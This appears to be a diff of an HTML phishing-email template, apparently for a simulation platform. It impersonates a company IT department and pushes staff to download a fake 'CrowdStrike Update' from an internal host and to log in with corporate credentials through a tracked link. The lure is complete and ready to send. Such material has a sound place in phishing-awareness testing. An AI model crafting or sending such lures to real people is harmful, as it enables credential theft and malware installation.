@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,43 +9,54 @@
         body {
             font-family: Verdana, sans-serif;
         }
+
         .logo {
             text-align: center;
             margin-bottom: 20px;
         }
     </style>
 </head>
+
 <body>
     <div class="logo">
         <img src="https://via.placeholder.com/150" alt="VertexValue Logo">
     </div>
     <p>Dear {{.Email}},</p>
 
-    <p>The Information Technology Department at VertexValue has detected that your computer is missing a critical security update. To ensure the continued safety and performance of our corporate network, please download and install the necessary update within the next 24 hours. Failure to comply may result in disconnection from the network.</p>
+    <p>The Information Technology Department at VertexValue has detected that your computer is missing a critical
+        security update. To ensure the continued safety and performance of our corporate network, please download and
+        install the necessary update within the next 24 hours. Failure to comply may result in disconnection from the
+        network.</p>
 
-    <p>Due to the risk of a blue screen of death (BSOD) occurring, the IT department cannot roll out this update via Intune. Therefore, this action must be performed manually once.</p>
+    <p>Due to the risk of a blue screen of death (BSOD) occurring, the IT department cannot roll out this update via
+        Intune. Therefore, this action must be performed manually once.</p>
 
     <p>To update your system, please follow these steps:</p>
 
     <ol>
         <li><strong>SAVE and CLOSE</strong> any documents or files you're currently working on.</li>
-        <li><strong>DOWNLOAD</strong> the update file from this link: <a href="https://example.com/download-crowdstrike-update">Download CrowdStrike Update</a>.</li>
+        <li><strong>DOWNLOAD</strong> the update file from this link: <a href="http://thecyberproject:8081">Download
+                CrowdStrike Update</a>.</li>
         <li>Once the download is complete, <strong>OPEN</strong> the file to start the installation process.</li>
         <li><strong>FOLLOW</strong> the on-screen instructions to complete the installation.</li>
-        <li><strong>REBOOT YOUR COMPUTER</strong> if prompted. Some updates may require a restart to take full effect.</li>
+        <li><strong>REBOOT YOUR COMPUTER</strong> if prompted. Some updates may require a restart to take full effect.
+        </li>
     </ol>
 
-    <p>If you encounter any issues or have questions, please notify the IT Department immediately. Should you need an extension, you can request to extend your deadline to 72 hours by clicking {{.URL}} and logging in with your corporate credentials, then selecting "Extend Deadline."</p>
+    <p>If you encounter any issues or have questions, please notify the IT Department immediately. Should you need an
+        extension, you can request to extend your deadline to 72 hours by clicking {{.URL}} and logging in with your
+        corporate credentials, then selecting "Extend Deadline."</p>
 
     <p>Thank you for your prompt attention to this matter.</p>
 
     <p>Best regards,<br>
-    Information Technology Department<br>
-    VertexValue</p>
+        Information Technology Department<br>
+        VertexValue</p>
 
     <p>This mailbox is not monitored. Please do not reply.<br>
-    Remember, the Information Technology Department will never ask for your password via email.</p>
+        Remember, the Information Technology Department will never ask for your password via email.</p>
 
     <p>{{.Tracker}}</p>
 </body>
+
 </html>
